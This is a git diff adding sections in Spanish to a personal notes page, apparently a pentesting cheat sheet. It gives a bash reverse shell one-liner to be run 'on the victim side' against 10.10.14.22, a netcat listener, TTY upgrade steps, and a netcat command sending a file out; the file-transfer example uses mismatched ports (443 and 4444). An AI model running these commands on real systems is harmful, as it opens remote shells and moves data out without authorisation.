@@ -86,3 +86,56 @@ ssh -i id_rsa user@hostname_or_ip
 
 ## [](#header-2)<a id="conclusiones">Conclusiones</a>
 Es necesario utilizar muchos dispositivos para alguien que se dedica a la tecnologia, por lo que lo mas practico seria utilizar solo una maquina para poder comunicarnos entre los dispositivos y poder configurarlos.
+
+
+# [](#header-1)Como hacer una reverse shell?
+El comando siguiente hara una peticion de conexion para la ip y puerto asignado:
+
+ ```bash
+ #Para ejecutar del lado de la victima
+bash -i >& /dev/tcp/10.10.14.22/443 0>&1
+```
+
+Ahora solo hara falta ponerse en escucha con netcat y para que funcione mejor la consola suelo usar tambien el rlwrap 
+
+```s
+rlwrap nc -nlvp 443
+```
+
+## [](#header-2)<a id="tratamiento tty">Tratamiento para la tty </a>
+
+Para hacer una shell iteractiva:
+
+```s
+script /dev/null -c bash
+```
+
+Ctrl+Z
+
+```s
+stty raw -echo; fg
+#ENTER
+reset xterm
+
+export TERM=xterm
+export SHELL=bash
+```
+
+Para las filas
+
+```s
+#Consulta de tamano
+stty size
+45  174
+#Para definir
+stty rows 45 columns 174
+```
+
+# [](#header-1)Envio de datos mediante netcat
+
+```s
+#Maquina que envia
+nc 10.10.14.22 443 < file_encrypt
+#Maquina que recibe
+nc -nlvp 4444 > file
+```
